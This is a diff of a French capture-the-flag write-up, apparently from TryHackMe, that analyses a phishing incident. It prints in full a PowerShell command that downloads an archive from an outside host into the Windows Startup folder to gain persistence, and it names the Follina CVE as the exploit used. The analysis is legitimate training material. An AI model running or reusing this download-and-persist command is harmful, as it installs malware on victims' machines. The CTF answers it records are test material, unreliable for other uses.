@@ -70,13 +70,13 @@ réponse : JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnK
 
 # Analyse de la commande PowerShell : persistance via le dossier Démarrage
 
-## Commande observée
+Commande observée : 
 
 ```powershell
 $app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
 ```
 
-## Décomposition
+Décomposition :
 
 | # | Commande | Action |
 |---|---|---|
@@ -95,5 +95,7 @@ Sur la photo de la question 5, on peut voir que l'outil msdt.exe est utilisé.
 En faisant des recherche, la CVE qui correspond à cette exploit est CVE-2022-30190 connu sous le nom de Follina.
 
 ![Tryhackme](00-Images/follina.png)
+
+réponse : 2022-30190
 
 
